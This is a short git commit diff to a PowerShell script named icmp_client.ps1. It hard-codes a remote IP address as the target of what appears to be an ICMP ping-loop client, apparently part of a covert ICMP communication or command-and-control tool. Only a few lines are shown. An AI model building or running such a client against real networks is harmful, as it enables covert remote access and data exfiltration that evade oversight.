44a6a77668c3bb21a507b9dd9b93cd796bf4eb23
Clickest <WojtekGoska@gmail.com>
2021-11-05 23:12:12 +0100

    Update icmp_client.ps1

--- icmp_client.ps1
+++ icmp_client.ps1
@@ -41,7 +41,7 @@ Function Stop-PreviousProcesses {
 }
 
 Stop-PreviousProcesses
-$sleep = 10; $target = ""
+$sleep = 10; $target = "13.74.175.47"
 while ($true) {
     if (Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue) {
         $ICMPClient = New-Object System.Net.NetworkInformation.Ping
